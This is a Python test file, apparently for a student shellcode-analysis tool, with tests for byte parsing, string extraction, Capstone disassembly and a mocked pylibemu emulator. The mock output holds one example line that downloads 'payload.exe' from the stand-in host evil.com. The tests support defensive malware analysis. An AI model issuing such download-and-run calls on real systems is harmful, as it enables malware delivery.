def test_parse_shellcode():
    assert parse_shellcode(r"\x90\x41") == b"\x90\x41"


def test_get_shellcode_strings():
    result = get_shellcode_strings(parse_shellcode(SHELLCODE_FACILE))
    assert "dll" in result.lower()


def test_get_capstone_analysis():
    result = get_capstone_analysis(parse_shellcode(r"\x90\x90\x90"))
    assert "nop" in result


def test_get_pylibemu_analysis():
    mock_emu = MagicMock()
    mock_emu.shellcode_getpc_test.return_value = 0
    mock_emu.emu_profile_output = "URLDownloadToFile(0, http://evil.com/payload.exe, 0, 0);"

    with patch("src.tp2.utils.shellcode.pylibemu.Emulator", return_value=mock_emu):
        result = get_pylibemu_analysis(parse_shellcode(SHELLCODE_FACILE))

    assert "URLDownloadToFile" in result
    mock_emu.prepare.assert_called_once()
    mock_emu.test.assert_called_once()
